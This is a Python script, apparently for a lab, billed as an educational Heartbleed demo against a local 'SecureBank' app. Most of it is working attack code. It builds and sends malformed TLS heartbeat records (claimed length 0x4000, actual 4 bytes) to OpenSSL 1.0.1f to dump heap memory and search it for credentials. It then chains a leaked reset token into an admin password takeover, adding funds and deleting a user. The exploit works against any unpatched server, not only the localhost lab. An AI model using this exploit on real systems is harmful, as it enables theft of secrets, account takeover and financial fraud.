#!/usr/bin/env python3
"""
SecureBank Heartbleed Demo — Full 3-Layer Attack
=================================================
Layer 1  TCP Heartbeat   : demonstrates the over-read mechanic (no TLS)
Layer 2  TLS Heartbeat   : fires a real heartbeat record at OpenSSL 1.0.1f
Layer 3  Attack Chain    : stolen token -> admin takeover -> account fraud
"""
from __future__ import annotations

import re
import socket
import ssl
import struct
import sys
import textwrap
import time
from typing import Iterable

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANK_URL       = "http://127.0.0.1:5000"
HTTPS_HOST     = "localhost"
HTTPS_PORT     = 4443
HB_HOST = "127.0.0.1"
HB_PORT        = 4444
MSG_HEARTBEAT  = 0x18
RESP_ERR       = 0x1F
MARKERS        = ["username=", "password=", "session=", "api_key=", "secretkey123", "reset_token="]


class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"


def section(title):
    w = 68
    print()
    print(C.BOLD + "+" + "-" * (w-2) + "+" + C.RESET)
    print(C.BOLD + "|  " + title.ljust(w-4) + "  |" + C.RESET)
    print(C.BOLD + "+" + "-" * (w-2) + "+" + C.RESET)


def banner():
    print(C.RED + C.BOLD + textwrap.dedent("""
    +====================================================================+
    |       SECUREBANK -- HEARTBLEED EDUCATIONAL DEMO                   |
    |  Layer 1: TCP over-read mechanic  (no TLS)                        |
    |  Layer 2: Real TLS heartbeat record -> OpenSSL 1.0.1f             |
    |  Layer 3: Token theft -> admin takeover -> account fraud          |
    +====================================================================+
    """) + C.RESET)


def pretty_dump(data, width=16):
    lines = []
    for offset in range(0, len(data), width):
        chunk    = data[offset:offset+width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        asc_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        lines.append(f"  {offset:04x}  {hex_part:<47}  {asc_part}")
    return "\n".join(lines)


def highlight_markers(text, markers):
    found = []
    for m in markers:
        idx = text.find(m)
        if idx != -1:
            found.append(text[idx:idx+80].split("|")[0])
    return found


# =============================================================================
# LAYER 1 - TCP heartbeat over-read
# =============================================================================
def seed_bank_session(username="admin", password="SecurePass123!"):
    print(C.CYAN + "  [->] Seeding server-side banking session via Flask backend..." + C.RESET)
    r = requests.post(f"{BANK_URL}/api/login",
                      json={"username": username, "password": password}, timeout=5)
    r.raise_for_status()
    d = r.json()
    print(C.GREEN + f"  [+] Stored {d['stored_bytes']} bytes.  Preview: {d['session_preview']}" + C.RESET)
    print(C.DIM   + "      Secret injected: api_key=secretkey123" + C.RESET)


def send_tcp_heartbeat(claimed_len, payload):
    pkt = struct.pack("!BHH", MSG_HEARTBEAT, claimed_len, len(payload)) + payload
    with socket.create_connection((HB_HOST, HB_PORT), timeout=5) as s:
        s.sendall(pkt)
        hdr = s.recv(3)
        if len(hdr) < 3:
            raise RuntimeError("No response from heartbeat server")
        resp_type, resp_len = struct.unpack("!BH", hdr)
        body = b""
        while len(body) < resp_len:
            chunk = s.recv(resp_len - len(body))
            if not chunk:
                break
            body += chunk
    return resp_type, body


def layer1_tcp():
    section("LAYER 1 -- TCP Heartbeat  (over-read mechanic, no TLS)")
    print("  The heartbeat protocol trusts the client-supplied payload length.")
    print("  Vulnerable: returns memory[:claimed_len] instead of memory[:actual_len].\n")

    seed_bank_session()

    # Trigger a password reset so the token gets seeded into server_memory.bin
    # via backend.php -> Flask /api/seed-token
    print(C.CYAN + "  [->] Triggering password reset to seed token into memory..." + C.RESET)
    try:
        sess = requests.Session()
        sess.verify = False
        r = sess.post(f"https://{HTTPS_HOST}:{HTTPS_PORT}/backend.php?action=forgot_password",
                      data={"username": "admin"}, timeout=5)
        if r.json().get("success"):
            print(C.GREEN + "  [+] Reset token generated and seeded into memory blob." + C.RESET)
        else:
            print(C.YELLOW + "  [!] Reset request failed -- token won't appear in dump." + C.RESET)
    except Exception as e:
        print(C.YELLOW + f"  [!] Could not seed reset token: {e}" + C.RESET)

    time.sleep(0.3)

    print(C.CYAN + "\n  [1a] Normal heartbeat  (claimed = actual = 4 bytes)" + C.RESET)
    rt, rb = send_tcp_heartbeat(claimed_len=4, payload=b"PING")
    print(C.GREEN + f"  [+]  type={rt:#x}  bytes_returned={len(rb)}" + C.RESET)
    print(f"       payload: {rb!r}")

    print(C.CYAN + "\n  [1b] Malformed heartbeat  (claimed=400, actual=4)" + C.RESET)
    rt, leak = send_tcp_heartbeat(claimed_len=400, payload=b"PING")

    if rt == RESP_ERR:
        print(C.YELLOW + "  [PATCHED] Server rejected mismatched length." + C.RESET)
        print("  Message:", leak.decode("utf-8", errors="ignore"))
        print(C.GREEN + "\n  Patch works: over-read was blocked." + C.RESET)
        return

    print(C.RED + f"  [!] Over-read returned {len(leak)} bytes (expected 4)." + C.RESET)
    print(C.YELLOW + "\n  Raw leak dump (credentials + reset token):" + C.RESET)
    print(pretty_dump(leak))

    hits = highlight_markers(leak.decode("latin1", errors="ignore"), MARKERS)
    print(C.YELLOW + "\n  Sensitive markers found:" + C.RESET)
    if hits:
        for h in hits:
            print(C.RED + f"    {h}" + C.RESET)
    else:
        print("    (none in this response)")

    print(C.GREEN + "\n  Takeaway: server trusted claimed_len, leaked adjacent heap bytes." + C.RESET)


# =============================================================================
# LAYER 2 - Real TLS heartbeat record against OpenSSL 1.0.1f
# =============================================================================
def build_tls_heartbeat_request(claimed_payload_len, payload):
    """
    TLS record  (ContentType=0x18, Version=TLS1.0, Length=len(msg))
    Heartbeat   (type=0x01 request, payload_len=claimed, payload=actual, padding=16x0)
    """
    padding       = b"\x00" * 16
    heartbeat_msg = struct.pack("!BH", 0x01, claimed_payload_len) + payload + padding
    tls_record    = struct.pack("!BHH", 0x18, 0x0301, len(heartbeat_msg)) + heartbeat_msg
    return tls_record


def do_tls_handshake_raw(host, port):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
    raw = socket.create_connection((host, port), timeout=10)
    return ctx.wrap_socket(raw, server_hostname=host)


def recv_tls_records(sock, timeout=3.0):
    sock.settimeout(timeout)
    records = []
    try:
        while True:
            hdr = sock.recv(5)
            if not hdr or len(hdr) < 5:
                break
            content_type, _, length = struct.unpack("!BHH", hdr)
            data = b""
            while len(data) < length:
                chunk = sock.recv(length - len(data))
                if not chunk:
                    break
                data += chunk
            records.append((content_type, data))
    except (socket.timeout, ssl.SSLError, OSError):
        pass
    return records


def layer2_tls():
    section("LAYER 2 -- Real TLS Heartbeat -> OpenSSL 1.0.1f  (CVE-2014-0160)")
    print("  Connects to Docker container running Apache + OpenSSL 1.0.1f.")
    print("  Sends malformed TLS heartbeat record (claimed_len >> actual_len).")
    print("  If vulnerable, OpenSSL responds with real server heap memory.\n")

    try:
        sock = do_tls_handshake_raw(HTTPS_HOST, HTTPS_PORT)
    except Exception as e:
        print(C.YELLOW + f"  [!] Cannot connect to {HTTPS_HOST}:{HTTPS_PORT}: {e}" + C.RESET)
        print(            "      Is the Docker container running?  ./start_server.sh")
        return

    print(C.GREEN + f"  [+] TLS handshake complete with {HTTPS_HOST}:{HTTPS_PORT}" + C.RESET)

    payload    = b"PING"
    hb_request = build_tls_heartbeat_request(claimed_payload_len=0x4000, payload=payload)

    print(C.CYAN + f"\n  [->] Injecting heartbeat  actual={len(payload)}B  claimed=0x4000 (16384B)" + C.RESET)
    try:
        sock.sendall(hb_request)
    except Exception as e:
        print(C.YELLOW + f"  [!] Send failed: {e}" + C.RESET)
        sock.close()
        return

    records = recv_tls_records(sock, timeout=4.0)
    sock.close()

    hb_responses = [(ct, d) for ct, d in records if ct == 0x18]

    if not hb_responses:
        print(C.YELLOW + "  [PATCHED / NO RESPONSE]  No heartbeat response received." + C.RESET)
        print("  The server may be patched or heartbeat extension is disabled.")
        return

    all_leaked = b"".join(d for _, d in hb_responses)
    print(C.RED + f"\n  [!] Heartbeat response: {len(all_leaked)} bytes leaked from server heap!" + C.RESET)
    print(C.YELLOW + "\n  Raw heap dump (first 256 bytes):" + C.RESET)
    print(pretty_dump(all_leaked[:256]))

    hits = highlight_markers(all_leaked.decode("latin1", errors="ignore"), MARKERS)
    print(C.YELLOW + "\n  Sensitive patterns found in heap:" + C.RESET)
    if hits:
        for h in hits:
            print(C.RED + f"    {h}" + C.RESET)
    else:
        print("    (none -- try seeding a session first, or send more requests)")

    print(C.GREEN + "\n  Takeaway: real OpenSSL 1.0.1f leaked actual process heap memory." + C.RESET)


# =============================================================================
# LAYER 3 - Full attack chain
# =============================================================================
def trigger_password_reset(session, username="admin"):
    r = session.post(f"https://{HTTPS_HOST}:{HTTPS_PORT}/backend.php?action=forgot_password",
                     data={"username": username})
    return r.json().get("success", False)


def extract_token_via_heartbleed(session):
    for size in [64, 128, 256, 512]:
        try:
            r = session.get(f"https://{HTTPS_HOST}:{HTTPS_PORT}/heartbleed_test.php",
                            params={"size": size}, timeout=5)
            if r.status_code != 200:
                continue
            for item in r.json().get("memory_exposed", []):
                if item.get("type") == "Password Reset Token":
                    m = re.search(r"token: ([a-f0-9]+)", item.get("data", ""))
                    if m:
                        return m.group(1)
        except Exception:
            pass
        time.sleep(0.3)
    return None


def layer3_attack_chain():
    section("LAYER 3 -- Full Attack Chain  (token theft -> takeover -> fraud)")
    print("  Assumes OpenSSL 1.0.1f container is reachable on port 4443.\n")

    session = requests.Session()
    session.verify = False

    try:
        session.get(f"https://{HTTPS_HOST}:{HTTPS_PORT}", timeout=3)
        print(C.GREEN + "  [+] Target reachable" + C.RESET)
    except Exception:
        print(C.YELLOW + f"  [!] Cannot reach https://{HTTPS_HOST}:{HTTPS_PORT}" + C.RESET)
        print(            "      Start Docker container: ./start_server.sh")
        return

    print(C.CYAN + "\n  [3a] Triggering password reset for 'admin'..." + C.RESET)
    ok = trigger_password_reset(session, "admin")
    print(C.GREEN + "  [+] Reset token generated (stored server-side)" + C.RESET if ok
          else C.YELLOW + "  [!] Reset request failed -- continuing anyway" + C.RESET)

    print(C.CYAN + "\n  [3b] Extracting token via Heartbleed memory disclosure..." + C.RESET)
    token = extract_token_via_heartbleed(session)
    if not token:
        print(C.YELLOW + "  [!] No token found in memory leak" + C.RESET)
        return
    print(C.RED + f"  [!] Token stolen: {token}" + C.RESET)

    reset_url = f"https://localhost:{HTTPS_PORT}/passwordreset.html?token={token}"
    print(C.YELLOW + f"\n  [!] Password reset URL with stolen token:" + C.RESET)
    print(C.BOLD   + f"      {reset_url}" + C.RESET)
    print(C.YELLOW + "\n  >>> Open the URL above in your browser to see the reset page." + C.RESET)
    print(C.YELLOW +   "      The victim's reset token is now in the attacker's hands." + C.RESET)
    input(C.BOLD   + "\n  Press ENTER to continue the attack..." + C.RESET)

    print(C.CYAN + "\n  [3c] Resetting admin password using stolen token..." + C.RESET)
    new_pass = "hacked123"
    r = session.post(f"https://{HTTPS_HOST}:{HTTPS_PORT}/backend.php?action=reset_password",
                     data={"token": token, "new_password": new_pass})
    if r.json().get("success"):
        print(C.GREEN + f"  [+] Admin password changed to '{new_pass}'" + C.RESET)
    else:
        print(C.YELLOW + "  [!] Password reset failed" + C.RESET)
        return

    print(C.CYAN + "\n  [3d] Logging in as admin..." + C.RESET)
    r = session.post(f"https://{HTTPS_HOST}:{HTTPS_PORT}/backend.php?action=login",
                     data={"username": "admin", "password": new_pass})
    if not r.json().get("success"):
        print(C.YELLOW + "  [!] Admin login failed" + C.RESET)
        return
    print(C.GREEN + "  [+] Admin login successful" + C.RESET)

    print(C.CYAN + "\n  [3e] Abusing admin privileges..." + C.RESET)
    r = session.post(f"https://{HTTPS_HOST}:{HTTPS_PORT}/backend.php?action=add_funds",
                     data={"target": "raj", "amount": 10000})
    print(C.RED + f"  [!] Added $10,000 to 'raj'  -> new balance: ${r.json().get('new_balance','?')}" + C.RESET)

    r = session.post(f"https://{HTTPS_HOST}:{HTTPS_PORT}/backend.php?action=delete_user",
                     data={"target": "arun"})
    print(C.RED + f"  [!] Deleted user 'arun'    -> {r.json().get('message','?')}" + C.RESET)

    print(C.GREEN + "\n  Attack chain complete." + C.RESET)
    print(C.BOLD  + "\n  Summary:" + C.RESET)
    print("    Heartbleed leaked a password reset token from server memory.")
    print("    Attacker reset admin credentials without knowing the original password.")
    print("    Full admin access -- financial records tampered.")


# =============================================================================
def main():
    banner()
    run_l1 = "--skip-l1" not in sys.argv
    run_l2 = "--skip-l2" not in sys.argv
    run_l3 = "--skip-l3" not in sys.argv
    if run_l1:
        layer1_tcp()
    if run_l2:
        layer2_tls()
    if run_l3:
        layer3_attack_chain()
    print()
    print(C.BOLD + "=" * 70 + C.RESET)
    print(C.BOLD + "  Demo complete." + C.RESET)
    print(C.DIM  + "  Flags: --skip-l1  --skip-l2  --skip-l3  to run individual layers." + C.RESET)
    print(C.BOLD + "=" * 70 + C.RESET)
    print()


if __name__ == "__main__":
    main()
